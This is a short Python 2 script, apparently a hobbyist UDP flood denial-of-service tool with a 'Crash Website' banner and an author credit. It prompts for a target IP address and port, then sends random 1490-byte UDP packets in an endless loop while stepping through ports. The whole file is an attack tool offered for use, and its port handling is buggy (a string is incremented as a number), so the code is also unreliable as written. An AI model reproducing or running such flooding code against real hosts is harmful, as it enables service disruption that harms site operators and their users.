#!usr/bin/python
import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


os.system("clear")

def author():
 print("TOOL IS CREATED BY KRISHNA PRANAV")
 print("Github Link https://www.github.com/krishpranav")
 print("Do Not Forget To Follow Me :)")

author()
 
print("""
\033[1;31m_________                      .__       __      __      ___.          .__  __          
\033[1;31m\_   ___ \____________    _____|  |__   /  \    /  \ ____\_ |__   _____|__|/  |_  ____  
\033[1;31m/    \  \/\_  __ \__  \  /  ___/  |  \  \   \/\/   // __ \| __ \ /  ___/  \   __\/ __ \ 
\033[1;31m\     \____|  | \// __ \_\___ \|   Y  \  \        /\  ___/| \_\ \\___ \|  ||  | \  ___/ 
\033[1;31m \______  /|__|  (____  /____  >___|  /   \__/\  /  \___  >___  /____  >__||__|  \___  >
\033[1;31m        \/            \/     \/     \/         \/       \/    \/     \/              \/
""")

ip = raw_input("Enter Your Target Ip Address To Crash >> ")
port = raw_input("Enter Your Target Port >> ")

author()

os.system("clear")
os.system("figlet Starting Attack...")
print("-" * 50)
time.sleep(5)
print("Attack Started")
time.sleep(5)
print("-" * 50)
time.sleep(5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
